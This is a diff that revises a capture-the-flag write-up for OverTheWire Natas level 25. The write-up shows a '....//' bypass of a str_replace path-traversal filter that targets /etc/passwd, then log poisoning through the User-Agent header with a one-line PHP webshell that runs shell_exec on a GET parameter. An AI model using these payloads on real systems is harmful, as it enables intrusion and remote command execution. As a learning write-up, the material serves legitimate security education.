@@ -126,6 +126,7 @@ Next, lets see `str_replace` . It Replaces all occurrences of the search string 
 ```php
 echo str_replace('../', '', '../../../../etc/passwd');  # Output : etc/passwd
 ```
+<br/>
 
 Then i looked at if somehow i can bypass these functions, and it turns out that yes, it could be done.
 
@@ -138,34 +139,39 @@ echo str_replace('../', '', '....//....//....//....//etc/passwd');  # Output : .
 
 So now, after `str_replace()` function runs, we can still slip in `../` characters and do Directory Traversal attack.
 
+<br/>
+
 Below, we use this to see a file that we know exists -> `/var/www/natas/natas25/logs/natas25_<SESSIONID>.log`
 
 ![](./images/Level25.1_solution.png)
 
 Above we have successfully conducted Directory Traversal attack, but still can't display password containing file `/etc/natas_webpass/natas26` becuase of the code logic.
 
-We will now poison the log file with our webshell using the `User-Agent` header (handy!) and see if this works.
+We'll now poison the log file with our webshell using the `User-Agent` header (handy!) and see if it works.
 
-Webshell payload:
+Our Webshell payload:
 ```php
 <?php echo '<pre>' . shell_exec($_GET[ 'cmd']) . '</pre>';?>
 ```
 
+It Worked and we have command execution! (happiness 👻)
+
 ![](./images/Level25.2_solution.png)
 
 
-Now we have command execution, lets reveal the password for next Level
+Now that we have command execution, lets reveal the password for next Level
 
 ![](./images/Level25.3_solution.png)
 
 <br/>
 <span id=green>**Takeaway**</span><br/>
 
-  - 
-  - 
+  - Read documentation and tested the PHP function strstr and str_replace<br/>
+  - Log File poisoning use case<br/>
+  - Chaining multiple vulnerabilities = Win<br/>
 
 <br/>
-This one was satisfying to do
+This one was satisfying to do 😆
 
 <br/>
 
